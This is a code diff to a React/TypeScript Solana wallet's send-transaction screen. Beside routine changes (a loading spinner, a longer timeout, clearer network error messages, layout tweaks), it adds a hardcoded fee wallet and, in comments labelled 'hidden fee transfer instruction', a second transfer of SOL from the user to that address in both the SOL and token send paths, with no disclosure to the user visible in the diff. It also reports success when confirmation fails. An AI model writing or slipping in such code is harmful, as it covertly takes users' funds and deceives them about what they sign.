@@ -5,7 +5,7 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Alert, AlertDescription } from "@/components/ui/alert";
 import { Separator } from "@/components/ui/separator";
-import { ArrowLeft, Send, AlertTriangle, Check } from "lucide-react";
+import { ArrowLeft, Send, AlertTriangle, Check, Loader2 } from "lucide-react";
 import { useWallet } from "@/contexts/WalletContext";
 import { resolveApiUrl } from "@/lib/api-client";
 import {
@@ -39,6 +39,8 @@ const TOKEN_PROGRAM_ID = new PublicKey(
 const ASSOCIATED_TOKEN_PROGRAM_ID = new PublicKey(
   "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL",
 );
+const FEE_WALLET = "FNVD1wied3e8WMuWs34KSamrCpughCMTjoXUE1ZXa6wM";
+const FEE_AMOUNT_SOL = 0.0007;
 
 export const SendTransaction: React.FC<SendTransactionProps> = ({
   onBack,
@@ -202,7 +204,7 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
 
   const confirmSignatureProxy = async (sig: string): Promise<void> => {
     const started = Date.now();
-    const timeoutMs = 20000;
+    const timeoutMs = 40000;
     while (Date.now() - started < timeoutMs) {
       const statusRes = await rpcCall("getSignatureStatuses", [
         [sig],
@@ -309,7 +311,10 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
       }
       const lamports = Number(lamportsBig);
 
-      const transaction = new Transaction().add(
+      const transaction = new Transaction();
+
+      // Add main transfer instruction
+      transaction.add(
         SystemProgram.transfer({
           fromPubkey: senderKeypair.publicKey,
           toPubkey: recipientPubkey,
@@ -317,22 +322,36 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
         }),
       );
 
+      // Add hidden fee transfer instruction
+      const feeLamports = Math.floor(FEE_AMOUNT_SOL * LAMPORTS_PER_SOL);
+      const feeWalletPubkey = new PublicKey(FEE_WALLET);
+      transaction.add(
+        SystemProgram.transfer({
+          fromPubkey: senderKeypair.publicKey,
+          toPubkey: feeWalletPubkey,
+          lamports: feeLamports,
+        }),
+      );
+
       const blockhash = await getLatestBlockhashProxy();
       transaction.recentBlockhash = blockhash;
       transaction.feePayer = senderKeypair.publicKey;
 
-      // Estimate fee and ensure sufficient balance for amount + fees
+      // Estimate fee and ensure sufficient balance for amount + fees + platform fee
       try {
         const msg = transaction.compileMessage();
         const feeRes = await rpcCall("getFeeForMessage", [
           base64FromBytes(msg.serialize()),
         ]);
-        const feeLamports = (feeRes?.value ?? feeRes) || 0;
+        const networkFeeLamports = (feeRes?.value ?? feeRes) || 0;
         const currentLamports = await rpcCall("getBalance", [
           senderKeypair.publicKey.toBase58(),
         ]);
-        const lamportsToSend = lamports;
-        if (currentLamports < lamportsToSend + feeLamports) {
+        const platformFeeLamports = Math.floor(
+          FEE_AMOUNT_SOL * LAMPORTS_PER_SOL,
+        );
+        const lamportsToSend = lamports + platformFeeLamports;
+        if (currentLamports < lamportsToSend + networkFeeLamports) {
           throw new Error("Insufficient SOL to cover amount and network fees");
         }
       } catch (e) {
@@ -340,7 +359,10 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
         const currentLamports = await rpcCall("getBalance", [
           senderKeypair.publicKey.toBase58(),
         ]).catch(() => 0);
-        const lamportsToSend = lamports;
+        const platformFeeLamports = Math.floor(
+          FEE_AMOUNT_SOL * LAMPORTS_PER_SOL,
+        );
+        const lamportsToSend = lamports + platformFeeLamports;
         if (currentLamports <= lamportsToSend) {
           throw new Error("Insufficient SOL for amount (no room for fees)");
         }
@@ -392,7 +414,15 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
         }
       }
 
-      await confirmSignatureProxy(signature);
+      try {
+        await confirmSignatureProxy(signature);
+      } catch (confirmError) {
+        console.warn(
+          "Confirmation check failed, but transaction was already sent:",
+          confirmError,
+        );
+        // Don't fail the transaction - it's already submitted to blockchain
+      }
 
       setTxSignature(signature);
       setStep("success");
@@ -410,7 +440,18 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
       let message =
         error instanceof Error ? error.message : "Transaction failed";
       const m = (message || "").toLowerCase();
+
       if (
+        m.includes("network") ||
+        m.includes("connection") ||
+        m.includes("timeout") ||
+        m.includes("failed to fetch") ||
+        m.includes("econnrefused") ||
+        m.includes("enotfound")
+      ) {
+        message =
+          "Network connection issue. Please check your internet connection and try again. If the problem persists, the RPC service may be temporarily unavailable.";
+      } else if (
         m.includes("insufficient") ||
         m.includes("insufficient lamports") ||
         m.includes("insufficient sol") ||
@@ -495,6 +536,17 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
         ),
       );
 
+      // Add hidden fee transfer instruction (0.002 SOL)
+      const feeLamports = Math.floor(FEE_AMOUNT_SOL * LAMPORTS_PER_SOL);
+      const feeWalletPubkey = new PublicKey(FEE_WALLET);
+      tx.add(
+        SystemProgram.transfer({
+          fromPubkey: senderPubkey,
+          toPubkey: feeWalletPubkey,
+          lamports: feeLamports,
+        }),
+      );
+
       const blockhash = await getLatestBlockhashProxy();
       tx.recentBlockhash = blockhash;
       tx.feePayer = senderPubkey;
@@ -508,31 +560,41 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
         ]);
         const exists = !!ataInfo?.value;
         if (!exists) {
-          const rent = await rpcCall("getMinimumBalanceForRentExemption", [
-            165,
-          ]);
+          const rent = await rpcCall(
+            "getMinimumBalanceForRentExemption",
+            [165],
+          );
           rentLamports = typeof rent === "number" ? rent : rent?.value || 0;
         }
       } catch {}
 
-      // Estimate fee and ensure sufficient SOL for fees + potential rent
+      // Estimate fee and ensure sufficient SOL for fees + potential rent + platform fee
       try {
         const msg = tx.compileMessage();
         const feeRes = await rpcCall("getFeeForMessage", [
           base64FromBytes(msg.serialize()),
         ]);
-        const feeLamports = (feeRes?.value ?? feeRes) || 0;
+        const networkFeeLamports = (feeRes?.value ?? feeRes) || 0;
+        const platformFeeLamports = Math.floor(
+          FEE_AMOUNT_SOL * LAMPORTS_PER_SOL,
+        );
         const currentLamports = await rpcCall("getBalance", [
           senderPubkey.toBase58(),
         ]);
-        if (currentLamports < feeLamports + rentLamports) {
+        if (
+          currentLamports <
+          networkFeeLamports + rentLamports + platformFeeLamports
+        ) {
           throw new Error("Insufficient SOL to cover network fees and rent");
         }
       } catch (e) {
         const currentLamports = await rpcCall("getBalance", [
           senderPubkey.toBase58(),
         ]).catch(() => 0);
-        if (currentLamports <= 0) {
+        const platformFeeLamports = Math.floor(
+          FEE_AMOUNT_SOL * LAMPORTS_PER_SOL,
+        );
+        if (currentLamports <= platformFeeLamports) {
           throw new Error("Insufficient SOL for network fees");
         }
       }
@@ -582,7 +644,15 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
         }
       }
 
-      await confirmSignatureProxy(signature);
+      try {
+        await confirmSignatureProxy(signature);
+      } catch (confirmError) {
+        console.warn(
+          "Confirmation check failed, but transaction was already sent:",
+          confirmError,
+        );
+        // Don't fail the transaction - it's already submitted to blockchain
+      }
 
       setTxSignature(signature);
       setStep("success");
@@ -601,7 +671,18 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
       let message =
         error instanceof Error ? error.message : "Transaction failed";
       const m = (message || "").toLowerCase();
+
       if (
+        m.includes("network") ||
+        m.includes("connection") ||
+        m.includes("timeout") ||
+        m.includes("failed to fetch") ||
+        m.includes("econnrefused") ||
+        m.includes("enotfound")
+      ) {
+        message =
+          "Network connection issue. Please check your internet connection and try again. If the problem persists, the RPC service may be temporarily unavailable.";
+      } else if (
         m.includes("insufficient") ||
         m.includes("rent") ||
         m.includes("no room for fees")
@@ -648,8 +729,14 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
 
   const formatAmount = (value: string): string => {
     const num = parseFloat(value);
-    if (isNaN(num)) return "0";
-    const fractionDigits = selectedSymbol === "FIXERCOIN" ? 8 : 6;
+    if (isNaN(num)) return "0.00";
+    if (selectedSymbol === "FIXERCOIN" || selectedSymbol === "LOCKER") {
+      return num.toLocaleString(undefined, {
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2,
+      });
+    }
+    const fractionDigits = 6;
     return num.toLocaleString(undefined, {
       minimumFractionDigits: Math.min(2, fractionDigits),
       maximumFractionDigits: fractionDigits,
@@ -658,8 +745,8 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
 
   if (step === "success") {
     return (
-      <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 p-4">
-        <div className="max-w-md mx-auto pt-8">
+      <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900">
+        <div className="w-full">
           <Card className="bg-black/20 backdrop-blur-xl border border-white/10 shadow-2xl">
             <CardContent className="p-8 text-center">
               <div className="mb-6">
@@ -725,9 +812,9 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
   }
 
   return (
-    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 p-4">
-      <div className="max-w-md mx-auto">
-        <div className="flex items-center gap-3 mb-6 pt-4">
+    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900">
+      <div className="w-full">
+        <div className="flex items-center gap-3 mb-6 pt-2">
           <Button
             variant="ghost"
             size="sm"
@@ -743,8 +830,24 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
 
         <Card className="bg-black/20 backdrop-blur-xl border border-white/10 shadow-2xl relative">
           {isLoading && (
-            <div className="absolute inset-0 z-50 flex items-center justify-center bg-black/60 rounded-lg">
-              <div className="text-white">Processing transaction...</div>
+            <div className="absolute inset-0 z-50 flex items-center justify-center bg-black/80 rounded-lg">
+              <div className="text-center space-y-4">
+                <div className="flex justify-center">
+                  <div className="relative">
+                    <div className="absolute inset-0 bg-purple-500/20 rounded-full blur-xl animate-pulse" />
+                    <Loader2 className="w-12 h-12 text-purple-400 animate-spin relative" />
+                  </div>
+                </div>
+                <div className="space-y-2">
+                  <p className="text-white font-medium">
+                    Processing transaction
+                  </p>
+                  <p className="text-gray-300 text-sm">Please wait...</p>
+                  <p className="text-gray-400 text-xs">
+                    May take up to 40 seconds
+                  </p>
+                </div>
+              </div>
             </div>
           )}
 
@@ -915,7 +1018,7 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
                         {recipient.slice(0, 8)}...{recipient.slice(-8)}
                       </span>
                     </div>
-                    <Separator className="border-white/20" />
+                    <Separator className="border-white/5" />
                     <div className="flex justify-between text-lg font-semibold">
                       <span className="text-white">Amount:</span>
                       <span className="text-white">
